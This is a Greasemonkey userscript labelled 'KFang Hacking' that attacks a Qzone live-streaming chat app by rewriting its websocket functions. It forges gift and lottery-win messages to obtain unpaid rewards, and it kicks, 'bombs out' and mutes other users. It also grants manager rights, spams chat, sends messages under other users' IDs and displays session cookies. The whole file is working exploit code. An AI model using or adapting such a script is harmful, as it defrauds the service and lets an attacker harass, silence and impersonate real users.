// ==UserScript==
// @name				KFang
// @namespace   0x123.com
// @author      Elf Sundae
// @description	KFang Hacking
// @copyright		www.0x123.com
// @icon        http://ctc.i.gtimg.cn/open/app_icon/00/64/60/15/100646015_50.png
// @license     GPL version 3
// @encoding    utf-8
// @run-at      document-end
// @include 		http://app100646015.qzone.qzoneapp.com/*
// @include			http://my.qzone.qq.com/app/100646015.*
// @require			http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js
// @date        20/12/2013
// @modified    13/04/2014
// @version    	0.1.1
// ==/UserScript==


// http://app100646015.qzoneapp.com/v/js/chat.js?gv=23_61

/** 自动刷奖timer */
var gAutoSendGiftTimer = null;
function stopAutoSendGiftTimer(){
	if (gAutoSendGiftTimer) {
		clearInterval(gAutoSendGiftTimer);
		gAutoSendGiftTimer = null;
		$('#auto_send_gift').val('刷奖');
	}
}

///
/// @param is_win: 是否中奖
///
function send_gift_handler(is_win) {
	//stopAutoSendGiftTimer();

	is_win = (typeof is_win === "undefined") ? false : is_win;

	var touser = $("#giftto_user").attr("uid");
	var nums = parseInt($("#gift_nums").val());
	var gift_id = parseInt($("#fake_gift_id").val());
	if (!gift_id || 0 == gift_id) {
		gift_id = $('.gift_ul li.currt').attr('gift');
	}

	if(!nums || nums == 0) {
		$(".quantity_list").show();
		return;
	}
	if(touser == userinfo.uid && gGifts[gift_id].only != 1) {
		Win.alert('不能送给自己，请选择其他用户');
		return;
	}
	if(!gUsers[touser]) {
		private_add('对方已经退出房间，赠送失败，请选择其他用户再送');
		return;
	}

	if(gift_id == 58) {
		if(touser == anchorinfo.uid) {
			Win.alert('不能送给主播，请选择其他用户');
			return;
		}
		//bomb_out(touser);
		ws_send('', touser, 0, 'kickout', '');
		return;
	}
	if(gift_id == 61) {
		ws_write({type:'fool',gid:anchorinfo.uid,uid:userinfo.uid,recv:touser,timeout:30000});
		return;
	}


	var effect = 0;
	if(gGifts[gift_id].play == 'flash') {
		effect = -1;
	}
	else {
		var total = $("#gift_nums").attr("nums");
		if(total == nums) {
			effect = $("#gift_nums").attr("rel");
		}
		if(total == 1) effect = 0;
	}

	var msg = { uid: userinfo.uid,gid: anchorinfo.uid, recv: touser, type: 'gift', gift_id: gift_id, gift_nums: nums, effect: effect, token: '', time: ''};
	if (is_win) {
		msg.award = gGifts[gift_id].award;
		if (64 == gift_id || 65 == gift_id) {
			msg.award = 500;
		}
		if (39 == gift_id) {
			msg.yuanbao = 200;
		}
	} else {
		if (39 == gift_id) {
			msg.yuanbao = Math.floor(Math.random() * (200 - 20 + 1)) + 20;
		}
	}

	ws_write(msg);
	$('.quantity_list').hide();
}

function send_gift_all(is_haohua) {
	stopAutoSendGiftTimer();
	$('.quantity_list').hide();
	is_haohua = (typeof is_haohua === "undefined") ? false : is_haohua;
	var touser = $("#giftto_user").attr("uid");
	var nums = parseInt($("#gift_nums").val());
	var id_arr = [];
	if (is_haohua) {
		id_arr = [51, 35, 50, 89, 38, 30, 57, 37, 36, 73, 74, 75, 76];
	} else {
		var i = 1;
		while( id_arr.push(i++) < 133 ){ }
	}
	var index = 0;
	for (var i = 0; i < id_arr.length; i++) {
		setTimeout(function(gift_id){
			return function() {
				if (!gGifts[gift_id]) {
					return false;
				}

				if(touser == userinfo.uid && gGifts[gift_id].only != 1) {
					return false;
				}
				if (!gUsers[touser]) {
					return false;
				}
				if (gift_id == 58 || gift_id == 61) {
					return false;
				}
				var effect = 0;
				if(gGifts[gift_id].play == 'flash') {
					effect = -1;
				}
				else {
					var total = $("#gift_nums").attr("nums");
					if(total == nums) {
						effect = $("#gift_nums").attr("rel");
					}
					if(total == 1) effect = 0;
				}
				//console.log(gift_id + ' ' + effect);
				//return false;
				var msg = { uid: userinfo.uid,gid: anchorinfo.uid, recv: touser, type: 'gift', gift_id: gift_id, gift_nums: nums, effect: effect, token: '', time: ''};
				if (39 == gift_id) {
					msg.yuanbao = Math.floor(Math.random() * (200 - 20 + 1)) + 20;
				}
				ws_write(msg);
			};
		}(id_arr[i]), 300*index);
		index++;
	}
}

//排麦
function mike_fake(touser, type) {
	var sort = 0;
	if(type) {
		for(var u in gUsers) {
			if(parseInt(gUsers[u].mikesort)) {
				sort++;
			}
		}
		if(sort == 0) {
			sort = 1;
		}
	} else {
		sort = 0;
	}
	ws_send(sort, touser, 0, 'mike', '');
	$('.relation_w').hide();
}

function mikeplay_fake(uid, type) {
	if(type == 0) {
		mike_fake(uid, 0);
	}
	var msg = {uid:userinfo.uid,gid:anchorinfo.uid,type:'mikeplay',recv:uid,play:type};
	ws_write(msg);
	$('.relation_w').hide();
}



function fake_connect_handler(event) {
	Win.alert('此功能暂未开放!');
	return;
	var touser = $("#user_id_text").val().trim();
	if (touser == '') return;
	console.log('begin>>>>>>');
	console.log(anchorinfo);
	var newInfo = {"uid":27285788,"account":"27285788","nickname":"·Candy","vip":23,"income":7599960,"manage":"12567010,14002640,19100156,26941513,12451872,18643303,26407775,14900061,16812329,15787667,12903495,14501253,18491620,11182723","is_mike":1,"is_live":0,"shield":0,"shield_expired":0,"placard":"新人主播试播中，给她送礼把她留下~","sayto":"",
	"time":anchorinfo.time,
	"token":anchorinfo.token,
	"fms_ip":"115.29.194.61"};
	anchorinfo = newInfo;

	console.log(document.cookie);
	console.log(anchorinfo);

	ws_init();
}

var isInQzone = false;

if (/app\/100646015\.html/.test(location)) {
	isInQzone = true;
}

if (isInQzone) {
	$('.lay_topfixed_inner').css({'position':'absolute'});
	$('#appCanvasTopAd').remove();
	$('#appCanvasTopBanner').remove();
	$('.topbar:first').remove();
	$('#appCanvasRecentApplist').remove();
	$('.side_wrapper:first').html('');
} else {
	// margin body left
	$("body:first").css({'margin-left':'10px'});
	var video_hall = $('.video_hall:first');
	if (video_hall.length > 0) {
		/* 隐藏“首充提示” */
		$('.first_buytip:first').hide();

		/*==============  底部区域 ================================*/
		var div = $('<div>').attr({style:"margin:5px 0 0 0;border:1px solid #fecae8; background:#FCE9F4; text-align:right"}).insertAfter(video_hall);
		/* 聊天刷屏 */
		$("<input>").attr({type:"button", value:"聊天刷屏", style:"font-size:18px;cursor:point;"}).click(function(){
			var msg = $("#txt_say").val().trim();
			if (msg == '') return;
			for(var i = 0; i < 10; i++) {
				setTimeout(function(){
					send();
					$("#txt_say").val(msg);
				}, 5*i);
			}
		}).appendTo(div);

		/* 彩虹字 */
		$("<a>").attr({href:"http://www.qqxiuzi.cn/zh/caihongzi/", 'target':'_blank', style:"margin-left:5px;"}).html("彩虹字").appendTo(div);
		$("<input>").attr({ type:'text', id:'color_text', value:'000', 'placeholder':'(#)F00,red', style:"margin-left:5px;width:50px;"}).appendTo(div);

		/* 飞屏 */
		$("<input>").attr({type:"button", value:"飞屏", style:"font-size:18px;cursor:point;margin-left:5px;"}).click(function(){
			var msg = $("#txt_say").val().trim(); if(msg == "") return; msg = msg.replace(/\"/g,"\'");
			var message = "<a href='/" + userinfo.gid + "'>" + userinfo.nickname.toString() + ": " + msg + '</a>';
			var data = {uid:userinfo.uid,gid:anchorinfo.uid,type:'flyscreen',msg:message};
			ws_write(data);
		}).appendTo(div);
		/* uid 输入框 */
		var uid_text = $("<input>").attr({ type:'text', id:'hack_uid', "placeholder":"uid", value:userinfo.uid, style:"margin-left:5px;width:70px;"}).appendTo(div);
		/* 别人中奖 */
		$("<input>").attr({type:'checkbox', id:'fake_award_checkbox', style:"margin-left:5px;"}).appendTo(div);
		$("<label>").html("别人中奖").attr({"for":"fake_award_checkbox" }).appendTo(div);
		/* 别人字体颜色 */
		$("<input>").attr({type:'checkbox', id:'color_font_for_others', style:"margin-left:5px;"}).appendTo(div);
		$("<label>").html("别人字体颜色").attr({"for":"color_font_for_others" }).appendTo(div);
		/* 字体尺寸 */
		$("<input>").attr({ type:'text', id:'text_style_fontsize', "placeholder":"12", value:'', style:"margin-left:5px;width:20px;margin-right:3px"}).appendTo(div);
		$("<label>").html("px").attr({"for":"text_style_fontsize" }).appendTo(div);
		/* 滚动字 */
		$("<input>").attr({type:'checkbox', id:'marquee_text_checkbox', style:"margin-left:5px;"}).appendTo(div);
		$("<label>").html("滚动字").attr({"for":"marquee_text_checkbox" }).appendTo(div);
		$("<input>").attr({type:'checkbox', id:'marquee_text_alternate_checkbox', style:"margin-left:5px;"}).appendTo(div);
		$("<label>").html("来回滚").attr({"for":"marquee_text_alternate_checkbox" }).appendTo(div);


		/* 重连Socket */
		$("<input>").attr({type:'button', style:"font-size:18px;cursor:point;margin-left:5px;", value:"重连Socket"}).click(function(){
			ws_init();
		}).appendTo(div);
		var close_flash = $("<a>").attr({href:"javascript:;"}).html($(".close_flash:first").html()).click(function(){
			$(".close_flash:first").trigger("click", $(".close_flash:first"));
			$(this).html($(".close_flash:first").html());
		}).appendTo(div);
		if (userinfo.uid != anchorinfo.uid) {
			 setTimeout(function(){
			 	close_flash.trigger("click");
			 }, 1000);
		}

		/*==============  礼物区域 ================================*/
		$(".noodles_list:first > .title:first > span").html('粉丝榜').css({marginLeft:0, width:'50px'});
		var gift_title = $(".noodles_list:first > .title:first");
		var giftButtonStyle = "cursor:point;font-size:18px;margin-left:5px";
		var gift_id = $("<input>").attr({type:'text', style:"width:30px;margin-left:6px;", id:"fake_gift_id", "placeholder":"giftID"}).appendTo(gift_title);

		function setGiftIDFunc(){
			setTimeout(function(){gift_id.val($(".gift_ul:first > ul").children(".currt").attr('gift'));}, 30);
		}
		var add_giftID_click = (function(){
			setGiftIDFunc();
			$(".gift_ul a").click(function(){
				setGiftIDFunc();
				// gift_id.val($(".gift_ul:first > ul").children(".currt").attr('gift'));
			});
		});
		$("#gift_nav a").click(function(){
			setTimeout(add_giftID_click, 30);
		})
		add_giftID_click();

		$("<input>").attr({type:'button', style:giftButtonStyle, value: "送礼"}).click(function(){
			send_gift_handler();
		}).appendTo(gift_title);
		$("<input>").attr({type:"button", style:giftButtonStyle, value:"中奖"}).click(function(){
			send_gift_handler(true);
		}).appendTo(gift_title);
		$("<input>").attr({type:"button", style:giftButtonStyle, value:"全套"}).click(function(){
			Win.confirm({align:'center',msg:'赠送<font color="red">全套</font>礼物？',click:function(){
				Win.close();
				send_gift_all();
			}});
		}).appendTo(gift_title);
		$("<input>").attr({type:"button", style:giftButtonStyle, value:"豪华"}).click(function(){
			Win.confirm({align:'center',msg:'赠送<font color="red">全套豪华</font>礼物？',click:function(){
				Win.close();
				send_gift_all(true);
			}});
		}).appendTo(gift_title);
		var auto_send_gift = $("<input>").attr({type:'button', style:giftButtonStyle, value:'刷奖', id:'auto_send_gift'}).click(function(){
			if (!gAutoSendGiftTimer) {
				Win.confirm({align:'center',msg:'自动刷奖？',click:function(){
					Win.close();
					var interval = prompt("间隔（毫秒）:", "500");
					if (interval) {
						$('#auto_send_gift').val('停止刷奖');
						gAutoSendGiftTimer = setInterval(function(){
							send_gift_handler();
							//handsel_gift(anchorinfo.uid);
						}, interval);
					}
				}});
			} else {
				stopAutoSendGiftTimer();
			}

		}).appendTo(gift_title);



		/*==============  user menu ================================*/
		var g_addedHackMenu = false;
		function add_hack_menu(){
			var menu = $(".relation_w:first");
			var uid = menu.attr('uid');
			var master = gUsers[uid].manage;

			menu.append("<p class='line_b'><span class='name_w'>" + uid + "</span></p>");

			$("<a>").html("选取UID").click(function(){
				menu.hide();
				uid_text.attr({value: uid});
			}).appendTo(menu);
			$("<a>").html("查看资料").click(function(){
				menu.hide();
				window.open("http://phone.app100646015.twsapp.com/profile/?uid=" + uid);
			}).appendTo(menu);

			/* 贴条 */
			//$("head link[rel='stylesheet']").last().after("<link rel='stylesheet' href='/v/css/gift.css?gv=20_68' type='text/css'>");
			var g_sticker_html = "<div>";
			for (var sid = 1; sid <= 64; ++sid) {
				g_sticker_html += "<a href='javascript:;' style='margin:0 2px 5px 2px' class='fake_sticker ico_j" + sid + "' sid='" + sid + "'></a>";
			}
			g_sticker_html += "</div>";
			$("<a>").html("贴条").click(function(){
				menu.hide();
				Win.dialog({msg:g_sticker_html, width:580, height:340});
				$(".fake_sticker").click(function(){
					Win.close();
					var data = {
						uid:userinfo.uid,
						gid:anchorinfo.uid,
						type:'stickers',
						recv:uid,
						stickers: $(this).attr('sid'),
						stickers_time: 5000,
					};
					ws_write(data);
				});

			}).appendTo(menu);

			if (gUsers[uid].gag == 0 && uid != userinfo.uid) {
				$("<a>").html("禁言5分钟").click(function(){
					menu.hide();
					Win.confirm({align:'center',msg:'真的要禁言 <font color="red">'+gUsers[uid].nickname+'</font> 用户吗？',click:function(){
						ws_send('', uid, 0, 'gag', '');
						Win.close();
					}});
				}).appendTo(menu);
			} else {
				$("<a>").html("解除禁言").click(function(){
					menu.hide();
					gUsers[uid].gag = 0;
					ws_send('', uid, 0, 'removegag', '');

				}).appendTo(menu);
			}

			$("<a>").html("踢出房间").click(function(){
				menu.hide();
				Win.confirm({align:'center',msg:'真的要踢出 <font color="red">'+gUsers[uid].nickname+'</font> 用户吗？',click:function(){
					ws_send('', uid, 0, 'kickout', '');
					Win.close();
				}});
			}).appendTo(menu);

			$("<a>").html("炸出房间").click(function(){
				menu.hide();
				Win.confirm({align:'center',msg:'真的要炸出 <font color="red">'+gUsers[uid].nickname+'</font> 用户吗？',click:function(){
					ws_send('', uid, 0, 'bombout', '');
					Win.close();
				}});
			}).appendTo(menu);

			// 管理员
			if (uid != anchorinfo.uid) {
				var manager_set_string = (master ? "取消管理员" : "升级管理员");
				var manager_set_type = (master ? 0 : 1);
				$("<a>").html(manager_set_string).click(function(){
					menu.hide();
					Win.confirm({align:'center',msg:'真的要<font color="red">' + manager_set_string + '</font> <font color="blue">'+gUsers[uid].nickname+'</font> ？',click:function(){
						Win.close();
						ws_send(manager_set_type, uid, 0, 'manage', '');
						ws_userlist();
						$(".relation_w").hide();
					}});
				}).appendTo(menu);
			}

			// 上麦
			if (gUsers[uid].play == '1') {
				$("<a>").html("结束直播").click(function(){
					menu.hide();
					Win.confirm({align:'center',msg:'真的要结束 <font color="red">'+gUsers[uid].nickname+'</font> 的直播吗？',click:function(){
						mikeplay_fake(uid, 0);
						Win.close();
					}});
				}).appendTo(menu);
			} else {
				if (gUsers[uid].mikesort > 0) {
					$("<a>").html("取消排麦").click(function(){
						menu.hide();
						Win.confirm({align:'center',msg:'真的要取消 <font color="red">'+gUsers[uid].nickname+'</font> 的排麦吗？',click:function(){
							mikecancel(uid);
							Win.close();
						}});
					}).appendTo(menu);

					$("<a>").html("开始直播").click(function(){
						mikeplay_fake(uid, 1);
					}).appendTo(menu);

				} else {
					$("<a>").html("加入排麦").click(function(){
						menu.hide();
						Win.confirm({align:'center',msg:'真的要加入 <font color="red">'+gUsers[uid].nickname+'</font> 排麦吗？',click:function(){
							Win.close();
							mike_fake(uid, 1);
						}});
					}).appendTo(menu);
				}
			}

		}
		var original_u_menu = u_menu;
		u_menu = function(obj, touser) {
			original_u_menu(obj, touser);
			add_hack_menu();
		}
		var original_say_user = say_user;
		say_user = function(uid, e) {
			if (!gUsers[uid]) {
				Win.alert(uid + '  已退出房间.');
			} else {
				original_say_user(uid, e);
				add_hack_menu();
			}
		}


		/*==============  rewrite functions ================================*/

		function msgWithColor(msg) {
			var color = $('#color_text').val().trim();
			if (color.match(/^#?[0-9a-fA-F]{3,6}$/g)) {
				if (color.indexOf('#') !== 0) {
					color = '#' + color;
				}
				if (color.match(/^#?0+$/g)) {
					color = '';
				}
			} else if (!color.match(/^\w+$/g)) {
				color = '';
			}

			if (color != '') {
				var text_style = "<font style='";
				text_style += "color:" + color + "; ";
				var fontsize = $('#text_style_fontsize').val().trim();
				if (fontsize.match(/^\d+/g)) {
					text_style += "font-size:" + fontsize + "px; ";
				}
				text_style += "'>";
				msg = text_style + msg + "</font>";
			}
			return msg;
		}

		function textShouldScroll() {
			return ($("#marquee_text_checkbox").is(":checked")) ? true : false;
		}
		function textShouldColorForOthers() {
			return ($("#color_font_for_others").is(':checked')) ? true : false;
		}

		function getHackUserID() {
			var uid = parseInt($("#hack_uid").val().trim());
			if (!gUsers[uid]) {
				uid = null;
			}
			return uid;
		}
		function msgWithMarquee(msg, speed) {
			if (!textShouldScroll()) {
				return msg;
			}
			speed = (typeof speed === "undefined" ? 3 : parseInt(speed));
			var behavior = ($("#marquee_text_alternate_checkbox").is(":checked")) ? "alternate" : "scroll";
			return "<marquee behavior='" +  behavior + "' scrollamount='" + speed + "'>" + msg + "</marquee>";
		}

		$("#txt_say").removeAttr('maxlength');
		var old_send = send;
		send = function(){
			var msg = $("#txt_say").val().trim();
			if(msg == "") return;
			msg = msg.replace(/\"/g,"\'");
			if (!textShouldColorForOthers()) {
				msg = msgWithColor(msg);
				msg = "<b>"+msg+"</b>";
				if (textShouldScroll()) {
					msg = msgWithMarquee(msg);
				}
			}
			var recv_uid = parseInt($("#sendto_user").attr("uid"));
			var quietly = $("#quietly_say").is(':checked');
			if(recv_uid == userinfo.uid) {
				private_add('不能自言自语');
				return;
			}
			if(recv_uid && !gUsers[recv_uid]) {
				private_add('对方已经退出房间，发送失败');
				return;
			}
			ws_send(msg, recv_uid, quietly, 'msg', '');
			$("#txt_say").val('').focus();
		}
		var old_ws_config = ws_config;
		ws_config = function() {
			// 盘古 6300000000  天神 4600000000 天尊 2600000000  玉皇 1600000000  天仙 1300000000
			// 地仙 800000000 大帝 600000000 皇帝 400000000 太子 330000000
			// userinfo.consume = 330000000;
			// userinfo.news = 1;
			/* car: 100 101 102 103 104 200 201 202 203 204 205 401 */
			//userinfo.car = 205;
			//userinfo.star=1;
			//userinfo.stickers = 26;
			//userinfo.stickers_time = 1800;
			//userinfo.account = 123456;
			//userinfo.shield = 4;
			//userinfo.vip = 24;
			//userinfo.nickname = "<img src='/v/img/face/mr/149.gif?v=2'>";
            	    	//userinfo.nickname = "小时候可白了";
            	    	//userinfo.account = 9876520;

			var zhouwang_arr = [
			// 1, // 梨
			// 5, // 苹果
			// 8, // 娃娃
			// 11, // 周星
			// 12, // 首富（钱袋）
			// 43, // 小姑娘
			//  21, // 蘑菇
			// 44, // 鬼
			// 25, // 光棍证
			];
			for (var i = 0; i < zhouwang_arr.length; i++) {
				zhouwang_arr[i] = "http://app100646015.qzoneapp.com/v/img/fa/p_gift"+ zhouwang_arr[i] + ".png?gv=1_1";
			}
			if (zhouwang_arr.length) {
				userinfo.zhouwang = zhouwang_arr.join(',');
			}
			if (userinfo.uid == anchorinfo.uid) {
				//anchorinfo.nickname = userinfo.nickname;
			}
			return old_ws_config();
		}
		var old_ws_data = ws_data;
		ws_data = function(data) {
			//console.log(data);
			if(data.type == 'login') {
				console.log("=====  " + data.nickname + "  ==== Login ====");
				console.log(data);
			} else if ('kickout' == data.type || 'bombout' == data.type) {
				stopAutoSendGiftTimer();
				if (userinfo.uid == data.recv) {
					var kickString = ('kickout' == data.type ? '踢出' : '炸出');
					Win.confirm({msg:'你被<font color="red">'+gUsers[data.uid].nickname+'('+data.uid+')</font>'+kickString+'此房间',width:500,enterValue:'免费解除',click:function(){
						ws_init();
						Win.close();
					}});

					return;
				}
			} else if ('gag' == data.type) {
				if (data.recv && data.recv == userinfo.uid) {
					stopAutoSendGiftTimer();
				}
			} else if ('gift' == data.type) {
				if (parseInt(data.award) > 0 && data.uid == userinfo.uid) {
					// 如果是我中奖，停止自动刷奖
					stopAutoSendGiftTimer();
				}
			} else if ('priv' == data.type) {
				var hackID = getHackUserID();
				if (textShouldColorForOthers() && hackID != userinfo.uid && data.quietly == '1' && data.recv == userinfo.uid) {
					var hack_msg = msgWithColor(data.msg);
					if (textShouldScroll()) {
						hack_msg = msgWithMarquee(hack_msg);
					}
					setTimeout(function(){
						ws_write({'uid':hackID, 'gid':userinfo.gid, 'msg':hack_msg, 'type':'msg'});
					}, 100);
				}
			} else if ('close' == data.type) {
				//非VIP不能双开, 这里return掉无效
			}

			old_ws_data(data);
			if ('gift' == data.type) {
				/* 给别人中奖 */
				if (($('#fake_award_checkbox').is(':checked')) &&
				(parseInt($("#hack_uid").val()) == data.uid) &&
				(!data.award || parseInt(data.award) <= 0)) {
					$('#fake_award_checkbox').attr("checked", false);
					data.award = gGifts[data.gift_id].award;
					data.yuanbao = 200;
					ws_write(data);
				}
			}
		}

		var old_ws_init = ws_init;
		ws_init = function() {
			//console.log('【ws_init】');
			//console.log(anchorinfo);
			old_ws_init();
		}

	} else {
		if (document.URL.match(/\/profile\/?$/g)) {
			$(document).ready(function(){
				$('.perdata_l:first').append("<p style='margin-top:15px'>" + "Cookie: " + document.cookie + "</p>");
			});
		}
	}
}
